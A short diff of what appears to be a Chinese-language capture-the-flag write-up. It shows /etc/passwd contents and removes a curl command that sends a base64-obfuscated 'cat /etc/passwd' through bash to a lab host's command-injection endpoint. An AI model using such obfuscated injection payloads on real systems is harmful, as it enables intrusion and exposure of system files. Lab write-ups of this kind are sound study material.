@@ -53,10 +53,6 @@ sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
 nitish:x:1001:1001::/home/nitish:/bin/bash
 ```
 
-```
-curl --data-urlencode "cmd=echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash" http://192.168.5.40:7331/wish
-```
-
 对下面的代码进行 base64：
 
 ```
